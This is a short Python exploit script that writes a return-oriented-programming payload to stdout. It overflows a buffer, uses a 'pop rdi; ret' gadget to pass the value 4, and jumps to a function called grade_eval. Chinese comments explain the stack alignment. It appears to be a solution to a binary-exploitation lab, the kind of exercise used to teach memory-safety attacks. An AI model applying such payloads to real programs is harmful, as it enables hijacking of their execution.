import sys
import struct

pop_rdi_addr = 0x401a33
grade_eval_addr = 0x401978  
ret_addr = 0x401a34  # 纯 ret，用来解决 printf 的栈对齐问题

payload = b"A" * 24
payload += struct.pack('<Q', pop_rdi_addr) # 跳去 pop rdi; ret
payload += struct.pack('<Q', 4)            # 4 被 pop 进 rdi
payload += struct.pack('<Q', ret_addr)     # 空气 ret，强迫栈对齐 16 字节
payload += struct.pack('<Q', grade_eval_addr) # 跳去 grade_eval

sys.stdout.buffer.write(payload + b'\n')
